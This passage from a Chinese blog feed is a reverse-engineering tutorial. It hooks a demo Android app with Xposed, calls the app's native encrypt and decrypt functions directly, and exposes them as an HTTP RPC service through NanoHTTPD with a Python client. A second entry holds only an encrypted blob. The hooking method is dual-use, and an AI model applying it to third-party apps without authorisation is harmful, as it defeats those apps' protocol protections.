调用"></a>Xposed 结合 NanoHTTPD 实现 RPC 调用</h4><p>&emsp;Xposed本身未提供RPC调用支持，但是可以结合NanoHTTPD（轻量级HTTP服务器）将主动调用导出为web服务实现。以demoso1工程为例，此工程中存在两个native函数，在应用打开后被循环调用。其中method01是静态函数，对输入进行加密并返回，method02是成员函数，对密文解密并返回。</p><p>&emsp;首先用xposed主动调用method01与method02：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.example.demoso1&quot;</span>))&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.example.demoso1.MainActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// 方法1：通过 hook 获取 MainActivity 对象实例</span></span><br><span class="line">        <span class="comment">// 得到 object 之前必须 hook onCreate 方法</span></span><br><span class="line">        XposedBridge.hookAllMethods(clazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            <span class="comment">// 由于 method01 与 method02 是 native 的，因此在 onCreate 执行前 method01/02 就已经准备就绪</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                <span class="comment">// 获取 MainActivity 对象</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">mMainActivity</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line">                <span class="comment">// 主动调用 method01 与 method02 函数</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">cipherText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;method01&quot;</span>, <span class="string">&quot;wd2711&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">clearText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;method02&quot;</span>, <span class="string">&quot;47fcda3822cd10a8e2f667fa49da783f&quot;</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;(1) cipherText =&gt; &quot;</span> + cipherText);</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;(1) clearText =&gt; &quot;</span> + clearText);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 方法2：通过 newInstance 获取对象实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">newMainActivity</span> <span class="operator">=</span> XposedHelpers.newInstance(clazz);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cipherText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(newMainActivity, <span class="string">&quot;method01&quot;</span>, <span class="string">&quot;wd2711&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">clearText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(newMainActivity, <span class="string">&quot;method02&quot;</span>, <span class="string">&quot;47fcda3822cd10a8e2f667fa49da783f&quot;</span>);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;(2) cipherText =&gt; &quot;</span> + cipherText);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;(2) clearText =&gt; &quot;</span> + clearText);</span><br><span class="line">        <span class="comment">// logic-4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231022154106062.png" alt="image-20231022154106062" style="zoom:67%;" /></p><p>&emsp;接下来，导入NanoHTTPD以进行RPC：</p><p>（1）在app/build.gradle文件的dependencies下增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation &#x27;org.nanohttpd:nanohttpd:2.3.1&#x27;</span><br></pre></td></tr></table></figure><p>&emsp;Nanohttpd只存在一个抽象类NanoHTTPD，主要有：start（启动web服务器）、stop（停止web服务器）、serve（收到web请求后的回调函数）。<code>serve只有一个参数，为IHTTPSession类型，可用于判断浏览器请求内容，包括请求方法、参数、URL等。</code>NanoHTTPD的构造函数可以指定web服务监听的端口。在此，简单的以NanoHTTPD实现hello world界面（应该加在上述代码的logic-4中）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_">NanoHTTPD</span>&#123;</span><br><span class="line">    <span class="comment">// App 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">App</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// 指定监听端口</span></span><br><span class="line">        <span class="built_in">super</span>(<span class="number">8899</span>);</span><br><span class="line">        <span class="comment">// start 启动 HTTP 服务</span></span><br><span class="line">        start(NanoHTTPD.SOCKET_READ_TIMEOUT, <span class="literal">true</span>);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Running!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// serve 回调函数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> NanoHTTPD.Response <span class="title function_">serve</span><span class="params">(IHTTPSession session)</span>&#123;</span><br><span class="line">        <span class="comment">// 获取 HTTP 方法：POST、GET</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> session.getMethod();</span><br><span class="line">        <span class="comment">// 获取 URI</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> session.getUri();</span><br><span class="line">        <span class="comment">// 获取访问者 IP</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">RemoteIP</span> <span class="operator">=</span> session.getRemoteIpAddress();</span><br><span class="line">        <span class="comment">// 获取访问者 HostName</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">RemoteHostName</span> <span class="operator">=</span> session.getRemoteHostName();</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;Method =&gt; &quot;</span> + method);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;URI =&gt; &quot;</span> + uri);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;Remote_IP =&gt; &quot;</span> + RemoteIP);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;RemoteHostName =&gt; &quot;</span> + RemoteHostName);</span><br><span class="line">        <span class="comment">// 页面返回值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;&lt;html&gt;&lt;body&gt;Hello wd2711\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> newFixedLengthResponse(Response.Status.OK, NanoHTTPD.MIME_PLAINTEXT, msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">App</span>();</span><br></pre></td></tr></table></figure><p>&emsp;安装好xposed插件，启动demoso1，并访问<code>手机IP+端口</code>，结果显示如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231022160559470.png" alt="image-20231022160559470" style="zoom:67%;" /></p><p>&emsp;浏览器访问结果如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231022160635723.png" alt="image-20231022160635723" style="zoom:67%;" /></p><p>（2）经过上面的测试，NanoHTTPD服务启动正常，接着更改serve内容，以增加函数主动调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> NanoHTTPD.Response <span class="title function_">serve</span><span class="params">(IHTTPSession session)</span>&#123;</span><br><span class="line">    <span class="comment">// 获取 URI</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> session.getUri();</span><br><span class="line">    <span class="comment">// 解析 POST 方法访问时的传参内容</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">paramBody</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    Map&lt;String, String&gt;params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// session.parseBody(params) 的目的是试着 parse 一下，看 session 是否是合理的</span></span><br><span class="line">        session.parseBody(params);</span><br><span class="line">        paramBody = session.getQueryParameterString();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ResponseException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(uri.contains(<span class="string">&quot;encrypt&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// getActivity() 函数返回之前获取的 MainActivity 对象</span></span><br><span class="line">        result = (String)XposedHelpers.callMethod(getActivity(), <span class="string">&quot;method01&quot;</span>, paramBody);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(uri.contains(<span class="string">&quot;decrypt&quot;</span>))&#123;</span><br><span class="line">        result = (String)XposedHelpers.callMethod(getActivity(), <span class="string">&quot;method02&quot;</span>, paramBody);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newFixedLengthResponse(Response.Status.OK, NanoHTTPD.MIME_PLAINTEXT, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;安装好xposed插件，启动demoso1，使用 curl进行post，结果如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231022164520100.png" alt="image-20231022164520100" style="zoom:67%;" /></p><p>（3）最后，使用python进行进一步封装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">param</span>):</span><br><span class="line">    url = <span class="string">&quot;http://192.168.48.14:8899/encrypt&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url = url, data = param, headers = headers)</span><br><span class="line">    <span class="built_in">print</span>(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">param</span>):</span><br><span class="line">    url = <span class="string">&quot;http://192.168.48.14:8899/decrypt&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url = url, data = param, headers = headers)</span><br><span class="line">    <span class="built_in">print</span>(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    encrypt(<span class="string">&quot;wd&quot;</span>)</span><br><span class="line">    decrypt(<span class="string">&quot;169dc260893dab88cd619d5e35e17634&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>&emsp;Hook上，frida与xposed不分伯仲。但是<code>在细节上，xposed支持使用setAdditionalInstanceField、setAdditionalStaticField等函数给实例对象添加动静态成员，而frida支持Java.choose从进程堆中搜索目标对象。在宏观上，frida可以热重载（不用重启），作用对象是特定进程，Hook原理类似于调试器，而xposed针对所有进程，类似于系统框架级服务。</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Frida逆向与协议分析-2&quot;&gt;&lt;a href=&quot;#Frida逆向与协议分析-2&quot; class=&quot;headerlink&quot; title=&quot;Frida逆向与协议分析-2&quot;&gt;&lt;/a&gt;Frida逆向与协议分析-2&lt;/h1&gt;&lt;p&gt;&amp;emsp;frida逆向与协议分析第二部分。&lt;/p&gt;</summary>
    
    
    
    <category term="re-book" scheme="https://wd-2711.tech/categories/re-book/"/>
    
    
  </entry>
  
  <entry>
    <title>intern-ms-prepare</title>
    <link href="https://wd-2711.tech/2023/09/25/intern-ms-prepare/"/>
    <id>https://wd-2711.tech/2023/09/25/intern-ms-prepare/</id>
    <published>2023-09-25T08:14:56.000Z</published>
    <updated>2023-10-07T06:51:04.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c963127f8aac97877aec58fbe696cb289c48ded0a8b52877523164b0abe6471a">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d55b5de3ad3678700c74bc3565095ff8718d1108a9dbc09cb1fbbfecee21d1a36da200d77877ff0bc8fa6417c4bb0b69671d8b2cbeded64bbb86392ddb8fa44ec993d0ac48ec1b58de64dd617dadcb8caf75ab1eedf14842c11703a57c093b7d388ef187b9aae90506d1d115d387aedbf282d12c90197a3c56a67ee37059a8beecc7a21d4f9b78657e291f697d599ec8567fbeef61115aa63e89879a5f4636adb842bc53eac5a1a317879b63e2e276b0437d1fc83c0a495b8682a549f4fbd534ec591201a3afb0c27e72ed35c60839373b16849067fadc07fc1feb7aa26d94e626c70f363a4aee92269579ea05f8c903d818542372aaa174595aef1958a1267285f37298f324e6adcacc7adeb6d753e2d62453ab63469d953cd0ccc9cf4d8ab0a6fdb3469f63b9ba84f87cf7b1365a6d154841579626651931f6767ab67d0eaf9510e238f46c5796b96c7be38085ffecec10bd1470dd62efe523a75001cf3db1fec4af9fa39980d4c6daacf67281057caf2cab7bc2fb3d8f156b312f0f978ca46c8b2ef66441d694e2f512e7d111df76aa1e5c2841dfb6a05bbc49a1951f0062697fd9a9478abef84e81123692f1f0fa8fabcaa5c6c22be28c4e30b9181f14295129e8a614d2e16e5769688473087e96600de4861db2704fc7cadf8faa2ff36f8914872942f41191122bb318b8270898bdd52dfab9eb9fe6a7a062e83b649fa6d4365a8276b6323258c0f4741d7baa16331098f95b968daf2484ffc585d50e621f5baa8bdeb97186fc455ec7ce8c1c461afe272a4621b1c45916ad9269eace8f57c93e1f2baa4dd68d5179780971d3304e3c618bfa0245f332476e9efd0463f4db2d132dce79b187bcd48c78a72124e67df253e0b75cd81b55eb36a2595828b4d1052cd98cd6e2b5c5178364d12907a1e3b9fcc7a82db3abf6e53eeff5fd5717f58dd025a0c25ade570de6ed6cab54e04e022f38505738d909269c604c585cbd6448289fc0b763899059dd5746285a1d974ea722a3d11a25ab7cabb8745a80d13f1d36d6a2c77e65f5d71a8053b4c4b6709a7ee9f03e4c43d5b4ee07372719fa72284538f2353b73b2a7aa07522c6a831698019c32be95da14900bcb76cc5337d1988a2d5779e6c7939492e3a4618ce1223c76c517b007623a00bf15e7752f4753ed004eabc2ac9007259f4529718fdfeafa9b85338f6b8e89e7030251e09245b2c2ea26f674200db0777ca45357abe565d440c229271eadda669b3e73a256525d125e6652ab53f4d6cffb63c92d44ad17d5faa6d84da2777f8f426591e89eaf5744dcc6c0b1010e0d72271dd4cb3580acbca968f7b1c8fa22246afc96ccd8a0775f5abf309652bd270505ef6bba78947cd463fcf316130f30c0604cdea8d44dacbd35abbffa9b2b3c0d08018b1bf4ee48baac940050b9a5811c42bb2be3874728f2fddb304ac0c03f40a3d4d6b686111906586768dc28713f0fc9a3f7a6cc1e2ce913cda132d7b6eb6f216ee551d0dee989044abc08d6da2b6a3ca72b42321ab5a58c9c2fede93f8d02b98aa505b2982cff7e1ee69f2218723387eab9cdffab09e71bd147eb8b92575c17e756fe4a6f391b35770f3ed6637d119f7e9b8aac8688eecfbdc225e1bc4b843ac130801575ad42f1c778db009a09eb03314d2d6267c988b15cd83cedff1a3ee4ba322b9fae56e78cc3a8248ea49f3deb1c11d6fed37eba1f4bfebe961819d11f7bf0a0a8a006ffb93915f55b56ba80211426c4ac3c84a4a0f92bc2b32a21f888f670c8a969cd4e849acf1ca7d81ef5415d6c19d427f9bf07e14e63187b0d781f2161993a182d1876e172daf5d7fdf4dad4f64fac0dab2617ba551492391706bc3164ad38c5d7674964e2fab5bf3b2e9038b39684452e726259139ebe145e7d45f3e942b102f744be2d71bbed733d42fdbf5e7da35325eb7d4b49f74903a0423b020329716398b96776523d01b65d6079ebcc20f2ee7ab54745d52b968dd295f338aaa95444cfd3de44fcff6336c89ad113785e8b33ecc7b5aebfadf2ab573569f8b0232ef1c84c34cbaf5e836b43721f31aae335ecb8bdfc223997131db033d49b4f178cf0af76a307362200c0dda161988c677e5f73cd4849cc9b6d8f7f6f1a6f3c5fc4f65d0f89f9b7bba9c51ce2f2724d537cacebe3cc963b230ca9eab73c78a0dc6b3f1359781b3a6d817be82e24c61522553f4ba4405a25804d61b42cf71c7bbaa510beecdcbe4cbfdcf376ff2262de06ee258e9137b93ab284fbe9b4e1e1a530c130a19bc9289ff7bba71dcd561848c7cb0f6f25a8c72a225c19529c313740d2c2cf4c85576b955b4a824b2865c62449667583e0001039d0c800c957301bc177d659e723f28ccd2db71f1cbbd2bd9fe328fb1732fd5509211d7964de083738e5860eb451083bf4ef5e200630af4a8ae5ffb2572a0a7a6448396875a06a20c5500a3a712782df252d180c784291167af78c0d02b04cb696d96a3c5a3047465d2af21bd2739a465d364476389fd73bf9966f6a8329516ceac05ccfedd9399a4bababe90bffefdad8c388391189021c03f386a9d05921f655ee364be27b1c8be87202239fcf1e436883a67f95e49a15a0b320b0e1693b128f7eef70a8ae7c2b7970c20672b8388d08d68be169aa99498250e501b24c463ea6cd8d48dcd9f147f6f851d87aecbad77fcc8b3c0eb079cbc76f86e5eeb5c96e2371e1650abcf9ca9a135e8542176efe0169e6dadbf5d485da2bcfdb97a00cebfa0ebd4f4a981252ef44dd30243a2c0e74a6fd1aa5285673b32fc1cfc4b8e9479d77326563b95ea2575c52c370406f1ba2d63d37ff830da9ca08309ee5e3bc3832aee67a9d057ff00a511a937e45fd6157801069ff047ec6c64b03a7124814c3ce7e7d512e9521ed5d1d2fce3afadfd43e33071b804dac868f2c01aa9c016749f42b42de46a978272c52dc236db190f4f3fd9e7a1ccd781e0d8f6b074deef988d88994c121e4d14c53f761b73a390e91e6a3bba604e2045d5b4cdda23cce9633d30b0d0f98dd36f044d6d405ae4bac8d18014a958e1bf49b36c4c29c6b95f03d313809a11ebc293fa0e16b9fce4f9ae8781a4f58924c8889a6ebd8b0f98757d5f9d95db7bdf49d36f0a999e6071b64b5300e9e017bfdf3b8d3839d0d256129228f50890acee9f7e2eeaa8135cd7c1b57c41c941738a3268e29e5afbb6c0ee3fe4828afa430cbbf4c482f977b57c00fc3bde82bc5486cb0ce1ca864b9b83fc79e04882bb89b65e93c0ac93505d8f3b5bd98c23bc34b42bfdec15c089b2ac0aeb69dde4a808beb443403a764aae998b5c2c82c44e41d0b886679e6b4de2ecf32a9743f9260c7a7a83ba6d400f9b026a7bbb10e766d939ce120939bf24c15c2ec8fe644ad4210ecf4852fac853f8e257447cc67d3b0167f848b019c6f801e71e5b3f76a009b1b8b619171649df255a5097104ea30f97fca0892bcf2d6a83519b51d706e789a33c2d9d7cff1bf2034769108bb342e707f52bebf6c532390ff6c4ad265e498af1a74145e07424df8d3f100ace75b70558bbb598072c4f42883137bd91fe09316941b47e3376f25eb7ff1fde678a93cf9c30549740ea63cff896afec919b749cd9063a500ada1f3f8f2da0f9a8763a554d3a3b22e39605322eafce9cfb89bb14cad00067516cdc6776f859b99d9d97eba884abe9ccf9537359eb8ea824bfac12998c6d84dd842d14a87a3152d13cfcde7ade8d4aecd02bd3008ae3523e24d1c52becba385598923dbdaa180aa6337500f771054cbe59faed91933cb9dfde770ff967895e2d500589602bcb2cddf8b5b6e683176ffec2a3c64fb207c7371bca3adeb7b8a2a0c0b7f746acaa4b1a85cb071ada39d5525dd42eea6f0b41e9f50d104f6762963223cfd76ce3305f712dee975c3edcda71cffa574b275de4c55ec751ffe1e5162432a11a742b1e0364bf7623872e6a0e4a8d8333ab95426fbd0ef16ba2158f21bb0096c63f6aafdb8f51bc8a7a4786c0295b9ae5fa504b218aabde3420e16f350ec33d8253c1f44a4e4d14726420ded4213a5e8e3a8efe6bd14cb0920895380abd91434ac533958d16c190af8138856ac2139187eb6de3283232d8c9b2f2da4899b06f06024d5bc60f7ef80f89e6a088468e78e8526463c4802d170cac1c7170527363a13d987fffbc216721c01c58350db3d94fac3cabc75f78eaa10c1b455e64d28956c07cdd0d88bc47536ef93b0ed7842a74ad06039708e3ab3fdb0345df2bf107889f08f073454267a7b604453accc5589bbbbfad426649071f8c068b60f60c9bef5bb2d3fe595a4600e10ce6e2cb3cb6dfbdee8b96a476eed69d9f41f2f6f83cb62704589500025363b0ef37f7e3fc048bbd3937478829bd5b12073368eb0cf7c798e6360e8e11a50decef3019f39644a75456cf70fcfc2dfbae20e3be05d24156480d4977ccd7bd18ca10588aa82f3b8d3ba20dc4b954c68a936d1f64d4910530b0ed3d9eae0977d52f9d79db769ae4147784d8296ced99619209e2d6c7420077d93a7ef5dc71d660233475b49c145b6a7de25d440e58367362fe6ce6a728cd5bfe5ab22d15b3618303a659d0495dd1d7f9d61999ca548decb17b5f370407dbbd724d6f1f690c9737b9d822910d7777972d6b629b93264211050c3f8a07a70386826d436e9cca0fa82f35adb034d696b3e67ac8dcd463925df5319f38deadb8917472e637cc590e68aa6ff52433092ff3028e5dbe63fdd4be4d07ac855d302feccc9a62093dfc0e1bbdd0935fb8e87b6c012221f79175d63f4e0d3a141512f41917d856eef62a79132874c733610d3c28470e6170bd51b37255e501229ca5fbe2b5cb07ede689764fefab1fbbd6927cebf1de91363e7ce882e8a006b19d50d0c3165813ce611bbe4418a4ee98a38c86ba15a5d6d65abb26a15160f242fa6ee960e9d1bb95f8eeb4c3ed2566ce1d923356a17338a23a137f4c3e83c1c894bd8f2372365c901e7fcb7fc6b9f6be06dd02be9717549e3555e1ac7f6dbf7e89d42ed6c0b026aacb982cbca065eb3fb780ee8d6f7c4381c8dbe03b3508d522668c3f354a74cc992ca5cf2cce56fbf630a3704eb16cbdc3f992a4b44b14212c0512d24fb9ec0eee14cd796ee6f058000223bd1cc072c8b5edbdcfeb51d86da5b187c9b17b60e746b7326aeb79a2e53b5e96c461dd1fd63f892419170464343b32cd5f621c7dfdc33f66dce37d0d896aa2c43f442ef018337e2e7375191bc7db133964d2e4c376353a67e63831c493e83ad2ce79c1096c6ac10c0571782b126f978385b661eb5d8e5a6ffbfcaf00a76cc3f2e10193ee3c065382fe2098cecab5c623b597de6f98eeb5148b6dab75ed9b2b4b88d37bab6f10db4f450bd12f26477524f38418f19281cfe91297f2ce9019f85838e55c8a9be1d6883ec41dd628866e4ddf2906f511fdf96f1873dd6a7c53a08f0492b8cf209b4739f8376cf0f45481277e0d71757455668a4ca57150357247df7ab11ca5c842452d2697591f2d8d1a134f7221914c0865d24de379422aa9644d6d9e819e8c284d16d40b081f2467aaf76e269d6f4f1def2e830027e6847c4eca9339f7c7ee528f7698babb3311159405d6449c2688a80ea0adb12a8d712bcbad1a5d17776009fa85dca7d4811147d0d8b9b6838aa19e4ba9fea0a004a9f0dff1dbd50246b17c2142d2752149b244efc83ff1af5cfbcfe19b3f1d938a4d30e6c93e5fe30c1f520f56bef030661cc23e4e22337ff1988814df7535259abbeb2f0df7133f9aca1f8d5ae93e7a1abbeb52c82103b0c43ace7d24738bcb1563b72712868008920e2f2ec108e5721fa93ec09e4270e84456a3b4a5acf57a220f1f8e9fd426b0552333970e451984d7bb5da1c013ee704dbc774b69abebdc8eeae5dc3165e79e1f49d98b50f356a86a7308a14ba679368148477fb2474d89b81d0cb70b82fe42c71c390709bfd492e3e33b0fbafeaa192d8881d2637bf498fbf3e4c017c667994d8d15003dcb211676809113c867e9f515eb8fbfcee943ea8f6a398eebc34fadec4a8aec74a4a1f114caccba394ea53b51f775ba038b4ca03f9fa3686204909e94145c21f65b5dea90e59a50b9b21ec8aafaea728a246ac6c4d04aba43df02e8bf36cc48d40422b05af470a05debbe112db6e892e52eb017384f6e0d206b21f881a9190184e7604ec747809b3b1c7683cf241bcbcc7e1f22e3e25f2a88e48fbc1e173898e4d1c36f49c52fb594326dae9f107769da6e19814571ba1dea184393cc189477af3a8a01354be23ef61719f558c5970a6805e8ef348189533dcb6f162e6f134d8e7932af26706e35aaf381df961610be2c5f7d2fac2d0d1d87ea5145f92ba136033b960e416ca4f39cd85aafe32a77f50fc422326f3be4ffed2d1d706a2fcff9694c03a5955303edbc2d2d2ce24ce85c8bc9f9dde7feeffd7796ceef9b9601367acecd381791acbcd6067a137a332616231141f5984a073efbbc791c11a2dd74bee538cfabe2b55e2538c08ba923bc3017efd41e350e74a4497e8dbf07bcf8f8169e7864b4ac7150653040f132bec3dbe123317a9544248c8c3b9a883de31dc4d854f616ebb85664b2f0ddb8d6eb041a61018d8c1f7538138b93bbeeb9b6e61d51a361b9bf06ee8eab47d98f4423de704c5c1ec351f45ff0510dfd04f0ad7da2ecb3af44af68a5e068b247570cc6f6a2c699065b879b6b3ff19de62e2ef11f1b31e972be9d811aedfb2beb880e631f80b02dc79c616cb6be10c315a0c4cf54dda25b19b62f5c471f1e1f07ece59c9ba135ea197a2d622438183c9403bc1e431e205511e4359414b9a82a4aaf8cee4b6431a5076a792817e32b512ccbc7d959ae2defa81063b6df9a215ca3f7cb172dbe64a8d19cfa52f822e446e26017e5212c5f155d6d770f7b90c944cf14b4b34f6510624e806210596cb977c9a4435cf353ae380f55ecc33cc20af90eab4a9c61d71384e493a481cfaa5010ef2cd4d93800e6c00bc435fe75ab8d259db104903a96760bc09c5c3fce624f33e655726f1050e0ffa784268a9ab750814d0a332114bc012305bf61d5b131dd34cf9b00bf7e4a6100890d741d1890a21991225f06eec5e5ecc70fcc5eaef0eb19e47e2b86ad8b6df50565b255aa19b8d8a3e236b123ebdd6a6ce79a13bc427977fb0e60f599473ccb40a6c30b552d1013e1a5022151db49c5abb5c71610ad334259883b7f56eaf690a616cfac3cd5fb5fcbcb1701e75dc31c45bb5e7fd240185cef7cee23240592ac5057020656837394c0e0a644930c45ab21340dce8c8da479eef26eca39b55894076acb242093fe07e595167f325b5bcd737c688b9a49b9674caab7e55c575ae54d34312feab0c081fccf11faa28f2e23dd763326591de830dcb977d7ece4ceca32a1eb15d9838cd834984328a08a8ebf00469d655ab4078c8605b66a3b7fc6595e7266d17a388bb046b6f0c3faadb2c0ab14d211f2dc40faed930312a3fd22e6c276f29c72f92e91365331f6876b5fd83ca598cd50f22cb2407bf53e1b6076c02549e5c73e771061cec80bdb4d553dd6fe4bfc427dfcef7aaf7ffa7cc77a501d3e5cb375d7c57d4f1efbc50bbbb0a8da1e7e7cffe13faf9fc9a1c700b7f3df349cac5e869fe4544386f41bb27981d5e1965c44542ec96ccbbb55b1dd54c10a4e93b7fdcfee28adebafce86df6ec49171d1311